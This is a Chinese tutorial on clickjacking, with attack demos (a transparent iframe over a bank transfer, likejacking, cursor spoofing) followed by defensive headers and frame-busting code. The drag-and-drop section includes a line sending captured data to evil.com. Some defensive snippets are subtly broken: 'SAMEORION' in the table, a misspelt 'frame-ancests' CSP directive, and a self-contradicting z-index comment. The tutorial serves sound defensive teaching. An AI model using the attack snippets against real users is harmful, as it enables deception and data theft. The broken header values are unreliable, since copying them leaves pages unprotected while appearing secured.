# 点击劫持 —— X-Frame-Options、CSP frame-ancestors

## 什么是点击劫持

点击劫持（Clickjacking）是一种视觉欺骗攻击。攻击者将目标网站嵌入到一个透明或半透明的 iframe 中，然后在上面覆盖一层精心设计的内容，诱导用户"自愿"点击——实际上点击的是被隐藏的目标网站。

这个名字的构成很有意思：Click（点击）+ Hijacking（劫持）。不是劫持你的账号，不是劫持你的数据，而是**劫持你的鼠标点击**。

想象一个生活场景：你走进一家商店，柜台上有张抽奖券写着"点击此处赢取 iPhone"。你兴奋地按了下去。但你不知道的是，这张纸下面压着一张转账授权书，而你的手指刚好按在了"确认"按钮上。你以为是抽奖，实际上完成了授权。

```html
<!-- 攻击者页面 evil.com/attack.html -->
<!-- 用户看到的是一个诱饵页面 -->

<!DOCTYPE html>
<html>
<head>
  <style>
    /* 目标网站：完全透明，不可见 */
    .target-iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      opacity: 0;          /* 关键：完全透明 */
      z-index: 2;
      pointer-events: auto; /* 接收点击事件 */
    }

    /* 诱饵层：覆盖在 iframe 上方 */
    .decoy-layer {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 1;          /* 在 iframe 下方？不，视觉上在上方 */
    }
  </style>
</head>
<body>
  <!-- 用户看到的：一个"免费领取"按钮 -->
  <div class="decoy-layer">
    <h1>恭喜！您获得了 VIP 会员资格！</h1>
    <button style="font-size:24px;padding:20px 60px;">
      立即领取
    </button>
  </div>

  <!-- 用户实际点击的：隐藏的目标网站中的按钮 -->
  <iframe class="target-iframe"
          src="https://bank.com/transfer?to=attacker&amount=99999">
  </iframe>

  <!-- 调整 iframe 内部滚动位置，使目标按钮正好对准"立即领取" -->
  <script>
    const iframe = document.querySelector('.target-iframe');
    // 将 iframe 滚动到目标按钮的位置...
  </script>
</body>
</html>
```

**哲学思考**：点击劫持揭示了人机交互中一个深刻的信任问题——**用户信任的是自己看到的东西，而不是实际发生的事情**。GUI（图形用户界面）的设计初衷是让操作变得直观，但这种直观性本身成了可被利用的弱点。当视觉呈现与底层行为可以脱钩时，用户的直觉就成了最不可靠的安全防线。

## 点击劫持的变种

### 类似劫持（Likejacking）

社交网络时代最常见的变体——诱导用户"点赞"或"关注"：

```javascript
// 追踪鼠标位置，让隐藏的 Like 按钮始终跟随光标
document.addEventListener('mousemove', (e) => {
  const hiddenBtn = document.querySelector('.hidden-like-btn');
  // 让隐藏按钮的中心对准鼠标位置
  hiddenBtn.style.left = (e.clientX - 50) + 'px';
  hiddenBtn.style.top = (e.clientY - 20) + 'px';
});

// 用户在任何地方点击，都会触发"点赞"
```

### 光标欺骗（Cursor Spoofing）

更高级的技术——伪造自定义光标，让用户以为自己的鼠标在正常位置：

```css
/* 隐藏真实光标 */
iframe-container {
  cursor: none;
}

/* 显示伪造光标（一张光标图片） */
.fake-cursor {
  position: fixed;
  pointer-events: none; /* 不拦截点击 */
  background: url('cursor.png') no-repeat;
  width: 32px;
  height: 32px;
  z-index: 9999;
}
```

```javascript
// 用假光标跟随鼠标，但有偏移量
document.addEventListener('mousemove', (e) => {
  const fakeCursor = document.querySelector('.fake-cursor');
  // 偏移 200px —— 用户以为自己点这里，实际点了那里
  fakeCursor.style.left = e.clientX + 200 + 'px';
  fakeCursor.style.top = e.clientY + 100 + 'px';
});
```

### 拖拽劫持（Drag & Drop Hijacking）

利用 HTML5 的拖放 API 进行数据窃取：

```javascript
// 诱导用户从敏感区域拖拽内容到陷阱区域
const trapZone = document.getElementById('trap');

trapZone.addEventListener('drop', (e) => {
  // 获取被拖拽的数据（可能是敏感信息）
  const data = e.dataTransfer.getData('text');
  // 发送到攻击者服务器
  fetch('https://evil.com/steal', { method: 'POST', body: data });
});

// 也可以反过来：把恶意数据注入到目标窗口
```

## 防御方案

### X-Frame-Options 响应头

最早的标准化防御手段，控制谁可以将当前页面嵌入 iframe：

```
# 完全禁止嵌入（最严格）
X-Frame-Options: DENY

# 只允许同源页面嵌入
X-Frame-Options: SAMEORIGIN

# 允许指定域名嵌入（已废弃，不推荐使用）
X-Frame-Options: ALLOW-FROM https://trusted.com
```

```javascript
// Express / Node.js 设置 X-Frame-Options
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  next();
});

// 使用 helmet 库（推荐）
const helmet = require('helmet');
app.use(helmet.frameguard({ action: 'sameorigin' }));
```

三种策略的选择：

| 值 | 效果 | 适用场景 |
|----|------|---------|
| `DENY` | 任何页面都无法嵌入 | 银行、支付等高安全站点 |
| `SAMEORION` | 仅同源可嵌入 | 大多数 Web 应用 |
| `ALLOW-FROM` | 指定白名单 | 已不推荐（浏览器支持不一致） |

### CSP frame-ancestors 指令

`X-Frame-Options` 的现代替代品，更灵活且是 CSP 规范的一部分：

```
Content-Security-Policy: frame-ancestors 'none'

Content-Security-Policy: frame-ancests 'self'

Content-Security-Policy: frame-ancestors https://embed.example.com
```

```javascript
// Express 中配置 frame-ancestors
app.use(helmet.contentSecurityPolicy({
  directives: {
    frameAncestors: ["'self'"],  // 同源才可嵌套
    // 或者完全禁用：
    // frameAncestors: ['none'],
  },
}));
```

**frame-ancestors 相比 X-Frame-Options 的优势**：
- 支持多个源（`ALLOW-FROM` 只能指定一个）
- 是 CSP 标准的一部分，统一管理安全策略
- 未来浏览器会持续维护和扩展

### JavaScript 防御（Frame Busting）

作为服务端防御的补充，客户端也能检测并阻止被嵌套：

```javascript
/**
 * 反嵌套检测工具类
 * 多种策略组合，提高可靠性
 */
class FrameBuster {
  /**
   * 策略一：检查 window.top 是否等于 window.self
   * 最经典但可能被 sandbox 属性绕过
   */
  static checkTop() {
    if (window.top !== window.self) {
      // 方式 A：跳出框架
      window.top.location = self.location;

      // 方式 B：清空页面内容
      document.body.innerHTML =
        '<h1>此页面不允许被嵌入到框架中。</h1>';

      // 方式 C：向顶层发送警告
      console.warn('[Security] Frame embedding detected!');
    }
  }

  /**
   * 策略二：style 防御
   * 如果被嵌套，强制让整个页面可见
   */
  static forceVisibility() {
    if (window.top !== window.self) {
      // 即使设置了 opacity: 0 或 visibility: hidden 也强制可见
      const style = document.createElement('style');
      style.textContent = `
        html { visibility: visible !important; opacity: 1 !important; }
        body { display: block !important; position: relative !important; }
      `;
      document.head.appendChild(style);
    }
  }

  /**
   * 策略三：定期轮询检测
   * 防止攻击者在初始检测后动态修改 DOM
   */
  static startPolling(interval = 500) {
    setInterval(() => {
      if (window.top !== window.self) {
        this.forceVisibility();
      }
    }, interval);
  }
}

// 页面加载时启用
FrameBuster.checkTop();
FrameBuster.startPolling(1000);
```

**重要提醒**：JavaScript 防御可以被 `sandbox` 属性绕过：

```html
<!-- sandbox 会限制 iframe 内脚本的执行能力 -->
<iframe src="https://target.com"
        sandbox="allow-scripts">
  <!-- allow-scripts 允许脚本运行 -->
  <!-- 但没有 allow-top-navigation → 无法访问 window.top -->
  <!-- Frame Busting 失效！ -->
</iframe>
```

所以 JavaScript 防御只能是辅助手段，**服务端响应头才是根本保障**。

### attribute="sandbox" 自我保护

如果你需要允许特定场景下嵌入，可以用 sandbox 属性精确控制权限：

```html
<!-- 最严格的 sandbox：几乎禁止一切 -->
<iframe src="https://example.com/embedded"
        sandbox>
</iframe>

<!-- 有选择地开放权限 -->
<iframe src="https://example.com/embedded"
        sandbox="allow-scripts allow-same-origin allow-forms">
</iframe>
```

`sandbox` 可选指令：

| 指令 | 允许的操作 |
|------|-----------|
| （空） | 禁止所有特殊权限 |
| `allow-scripts` | 执行 JavaScript |
| `allow-same-origin` | 将 iframe 内容视为同源 |
| `allow-forms` | 提交表单 |
| `allow-popups` | 打开弹窗 |
| `allow-top-navigation` | 导航顶层窗口 |
| `allow-downloads` | 下载文件 |

**哲学思考**：sandbox 的设计体现了 **最小权限原则（Principle of Least Privilege）** 在前端安全中的应用。默认拒绝一切，只明确开放必要的权限。这与操作系统进程沙箱、容器安全的思想一脉相承——安全不是一个开关，而是一组精细的权限控制旋钮。

## 综合防护示例

```javascript
/**
 * 完整的点击劫持防护中间件
 */
function clickjackingDefense(req, res, next) {
  // 第一层：X-Frame-Options（兼容旧浏览器）
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');

  // 第二层：CSP frame-ancestors（现代标准）
  // 注意：不能通过 JS 设置 CSP frame-ancestors，
  // 必须在服务端响应头中设置
  const existingCsp = res.getHeader('Content-Security-Policy') || '';
  const frameAncestorsRule = "frame-ancestors 'self'";
  res.setHeader(
    'Content-Security-Policy',
    existingCsp ? `${existingCsp}; ${frameAncestorsRule}` : frameAncestorsRule
  );

  next();
}
```

点击劫持虽然看起来不如 XSS、CSRF 那么声名显赫，但它的危害不容小觑。2018 年某知名视频平台的"观看视频自动关注"事件，就是典型的类似劫持。在安全的世界里，**任何一种看似简单的攻击方式，一旦结合社会工程学的技巧，都能产生超出预期的破坏力**。
